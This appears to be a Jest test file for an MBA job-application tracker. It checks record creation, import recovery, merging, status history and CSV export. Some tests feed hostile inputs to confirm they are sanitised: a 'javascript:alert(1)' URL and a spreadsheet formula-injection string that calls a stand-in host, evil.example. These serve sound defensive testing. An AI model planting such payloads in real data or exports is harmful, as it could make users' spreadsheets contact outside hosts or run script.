import {
  buildMBAApplicationsCsv,
  buildMBAApplicationsExport,
  createManualMBAApplication,
  createMBAApplicationFromJob,
  mergeMBAApplications,
  parseMBAApplications,
  updateMBAApplicationStatus,
} from "../mba-applications";
import type { MBAJob } from "@/types/mba-jobs";

const job: MBAJob = {
  id: "stripe-1",
  companyId: "stripe",
  companyName: "Stripe",
  title: "MBA Product Intern",
  location: "San Francisco, CA",
  department: "Product",
  applyUrl: "https://example.com/apply",
  postedAt: "2026-04-14T16:00:00.000Z",
  atsType: "greenhouse",
  category: "fintech",
  snippet: "Summer associate role.",
  roleType: "internship",
  roleFamilies: ["product"],
};

describe("mba applications storage helpers", () => {
  it("creates durable job snapshots for live roles", () => {
    const application = createMBAApplicationFromJob(
      job,
      "applied",
      new Date("2026-04-15T12:00:00.000Z")
    );

    expect(application.jobId).toBe("stripe-1");
    expect(application.status).toBe("applied");
    expect(application.appliedAt).toBe("2026-04-15T12:00:00.000Z");
    expect(application.jobSnapshot).toEqual(
      expect.objectContaining({
        title: "MBA Product Intern",
        capturedAt: "2026-04-15T12:00:00.000Z",
        source: "live-feed",
      })
    );
  });

  it("sanitizes manual applications and rejects missing required fields", () => {
    expect(
      createManualMBAApplication({
        companyName: "",
        title: "Strategy Manager",
        location: "",
        department: "",
        applyUrl: "https://example.com",
      })
    ).toBeNull();

    const application = createManualMBAApplication({
      companyName: "Acme",
      title: "Strategy Manager",
      location: "",
      department: "",
      applyUrl: "javascript:alert(1)",
      sourceUrl: "https://careers.example.com/role",
      notes: "  Talk to alumni.  ",
      followUpDate: "2026-04-20",
    });

    expect(application).toEqual(
      expect.objectContaining({
        jobId: null,
        sourceUrl: "https://careers.example.com/role",
        notes: "Talk to alumni.",
        followUpDate: "2026-04-20",
      })
    );
    expect(application?.jobSnapshot.applyUrl).toBe("");
  });

  it("recovers from corrupted storage and sanitizes imported exports", () => {
    expect(parseMBAApplications("{not-json")).toEqual([]);

    const application = createMBAApplicationFromJob(job);
    const exported = buildMBAApplicationsExport([application]);
    const parsed = parseMBAApplications(JSON.stringify(exported));

    expect(parsed).toHaveLength(1);
    expect(parsed[0]).toEqual(
      expect.objectContaining({
        jobId: "stripe-1",
        status: "saved",
        priority: "medium",
      })
    );
  });

  it("merges duplicate applications by job id and keeps the newest update", () => {
    const older = createMBAApplicationFromJob(
      job,
      "saved",
      new Date("2026-04-14T12:00:00.000Z")
    );
    const newer = {
      ...older,
      status: "interviewing" as const,
      updatedAt: "2026-04-16T12:00:00.000Z",
    };

    const merged = mergeMBAApplications([older], [newer]);

    expect(merged).toHaveLength(1);
    expect(merged[0].status).toBe("interviewing");
  });

  it("exports spreadsheet-safe CSV", () => {
    const application = {
      ...createMBAApplicationFromJob(job),
      notes: "Recruiter said, \"follow up\"",
    };

    const csv = buildMBAApplicationsCsv([application]);

    expect(csv).toContain("Status,Priority,Company");
    expect(csv).toContain('"Recruiter said, ""follow up"""');
  });

  it("keeps status changes through import, archive, and merging an older writer", () => {
    const saved = createMBAApplicationFromJob(job, "saved", new Date("2026-10-01T12:00:00Z"));
    const interview = updateMBAApplicationStatus(saved, "interviewing", new Date("2026-10-03T12:00:00Z"));
    const archived = updateMBAApplicationStatus(interview, "archived", new Date("2026-10-06T12:00:00Z"));
    const parsed = parseMBAApplications(JSON.stringify([archived]))[0];
    expect(parsed.statusHistory?.map((event) => event.status)).toEqual(["saved", "interviewing", "archived"]);
    expect(updateMBAApplicationStatus(parsed, "archived").statusHistory).toEqual(parsed.statusHistory);
    const oldWriter = { ...parsed, statusHistory: undefined, notes: "New note", updatedAt: "2026-10-07T12:00:00Z" };
    expect(mergeMBAApplications([parsed], [oldWriter])[0].statusHistory).toEqual(parsed.statusHistory);
    const staleInterview = { ...interview, updatedAt: "2026-10-05T12:00:00Z" };
    expect(mergeMBAApplications([parsed], [staleInterview])[0].statusHistory).toEqual(parsed.statusHistory);
    // An older backup at a status the history never saw adds that one event and no repeat of the current status.
    const current = { ...interview, notes: "Later note", updatedAt: "2026-10-08T12:00:00Z" };
    const backup = { ...interview, status: "applied" as const, statusHistory: undefined, updatedAt: "2026-09-20T12:00:00Z" };
    expect(mergeMBAApplications([current], [backup])[0].statusHistory?.map((event) => event.status)).toEqual(["applied", "saved", "interviewing"]);
  });

  it("drops malformed history events and marks legacy progress as observed", () => {
    const legacy = { ...createMBAApplicationFromJob(job, "interviewing"), statusHistory: undefined };
    const rejected = updateMBAApplicationStatus(legacy, "rejected");
    expect(rejected.statusHistory?.[0]).toMatchObject({ status: "interviewing", kind: "observed" });
    const malformed = { ...rejected, statusHistory: [{ status: "constructor", at: "2026-10-01" }, { status: "offer", at: "invalid" }, ...rejected.statusHistory!] };
    expect(parseMBAApplications(JSON.stringify([malformed]))[0].statusHistory).toEqual(rejected.statusHistory);
  });

  it("neutralizes spreadsheet formula injection in exported CSV", () => {
    const base = createMBAApplicationFromJob(job);
    const application = {
      ...base,
      notes: "@SUM(A1:A9)",
      jobSnapshot: {
        ...base.jobSnapshot,
        location: '=WEBSERVICE("https://evil.example/x")',
      },
    };

    const csv = buildMBAApplicationsCsv([application]);

    // A leading formula character (= + - @, or tab/CR) is prefixed with a
    // single quote so Excel/Sheets treats the cell as text, not a formula.
    expect(csv).toContain("'=WEBSERVICE");
    expect(csv).toContain("'@SUM(A1:A9)");
    // The raw formula must never sit at a cell boundary where it would evaluate.
    expect(csv).not.toMatch(/,=WEBSERVICE/);
    expect(csv).not.toMatch(/,@SUM/);
  });
});

